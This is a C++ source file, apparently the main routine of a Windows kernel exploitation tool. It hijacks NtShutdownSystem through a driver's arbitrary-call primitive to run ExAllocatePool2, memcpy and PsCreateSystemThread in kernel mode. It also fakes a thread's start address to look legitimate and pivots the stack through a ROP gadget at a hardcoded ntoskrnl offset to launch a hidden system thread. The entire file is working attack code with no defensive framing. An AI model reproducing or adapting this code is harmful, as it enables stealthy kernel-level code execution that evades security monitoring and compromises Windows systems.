#include <include/driver/arbitrary_call.hpp>
#include <include/utils/utils.hpp>
#include <iostream>
#include <include/stack/stack_manager.hpp>

int main()
{
    if (!Utils::EnableDebugPrivilege())
    {
        std::exception("Failed to enable debug privileges");
        return EXIT_FAILURE;
    }

    const std::uintptr_t RandomValidThreadAddress = Utils::FindRandomValidThreadAddress();
    if (!RandomValidThreadAddress)
    {
        std::exception("Failed to find a random valid thread address");
        return EXIT_FAILURE;
    }

    std::printf("[+] New thread address to be used @ 0x%p\n", RandomValidThreadAddress);
    std::printf("[+] ntoskrnl.exe @ 0x%p\n", Driver::GetKernelModuleBase());

    Driver::ArbitraryCaller KernelCaller = Driver::ArbitraryCaller();

    const void* NtShutdownSystem = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtShutdownSystem");

    KernelCaller.RedirectCallByName("NtShutdownSystem", "ExAllocatePool2");
    void* StackAllocation = reinterpret_cast<void* (*)(std::uint32_t, std::size_t, std::uint32_t)>(NtShutdownSystem)(0x40 | 0x2, 0x3000, 'Thre');
    KernelCaller.DisableRedirectByName("NtShutdownSystem");
    std::printf("[+] Stack @ 0x%p\n", StackAllocation);

    if (!StackAllocation)
        return EXIT_FAILURE;

    StackManager KernelStackManager(Driver::GetKernelModuleBase(), reinterpret_cast<std::uintptr_t>(StackAllocation));

    // Fake the thread's start address to the random legitimate one we found
    KernelStackManager.ModifyThreadStartAddress(RandomValidThreadAddress);

    KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(StackAllocation, KernelStackManager.GetStackBuffer(), KernelStackManager.GetStackSize());
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    Sleep(500);
    std::cin.get();

    void* BootstrapGadget = (void*)(Driver::GetKernelModuleBase() + 0x9b8ac1); // push rcx; pop rsp; test edx, edx; je 0x9b8acd; add rsp, 0x28; ret;
    void* OffsetedStackAllocation = (void*)((std::uintptr_t)StackAllocation - 0x28); // account for 0x28 being added in gadget

    HANDLE KernelThreadHandle;
    KernelCaller.RedirectCallByName("NtShutdownSystem", "PsCreateSystemThread", (void*)NULL, (void*)BootstrapGadget, OffsetedStackAllocation);
    NTSTATUS ThreadCreation = reinterpret_cast<NTSTATUS(*)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, HANDLE)>(NtShutdownSystem)(
        &KernelThreadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL
    );
    KernelCaller.DisableRedirectByName("NtShutdownSystem");
    
    return EXIT_SUCCESS;
}